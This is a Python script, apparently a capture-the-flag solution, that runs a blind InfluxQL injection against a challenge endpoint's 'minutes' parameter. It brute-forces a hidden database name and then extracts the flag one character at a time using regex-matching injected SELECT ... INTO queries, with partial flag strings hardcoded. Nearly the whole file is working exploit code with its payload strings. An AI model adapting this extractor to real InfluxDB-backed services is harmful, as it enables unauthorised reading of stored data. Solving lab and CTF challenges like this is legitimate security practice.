import requests
import string
import re

URL = "http://qxsxftgofshuzybziwyxbfeeolqcooxn.g2.ctf.so/q"

db = "a"

# for _ in range(9):
#     for c in "0123456789abcdef":
#         _db = db + c
#         res = requests.get(URL,
#                         {"minutes": f'10m; SELECT "database" AS "value", numMeasurements INTO "bytes_sent" from _internal.."database" where "database" =~ /{_db}/; -- '})
#         if res.text.strip() != "[]":
#             db = _db
#             print(db)
#             break

db = "ae5cc7b33a"
# flag = "we{e01bf177-2fe1-4eba-8f95-b517d0c7efa2@not-sql"
flag = "we{e01bf177-2fe1-4eba-8f95-b517d0c7efa2@not-sql"
flag = "we{e01bf177-2fe1-4eba-8f95-b517d0c7efa2@not-sql 1|\|JE(710|\|!}"
# flag = "}"
while True:
    # if flag.endswith("}"): break
    for c in string.printable:
        # _flag = re.escape(flag + c)
        if c in "/\\": continue
        print(flag + c)
        print(
            f'10m; SELECT "flag" AS "value" INTO "bytes_sent" from {db}../.*/ where "flag" =~ /we{"."*(len(flag)-2)}{re.escape(c)}/; -- ')
        res = requests.get(URL,
                           {"minutes": f'10m; SELECT "flag" AS "value" INTO "bytes_sent" from {db}../.*/ where "flag" =~ /we{"."*(len(flag)-2)}{re.escape(c)}/; -- '})
        if res.text.strip() != "[]":
            flag += c
            print(flag)
            break
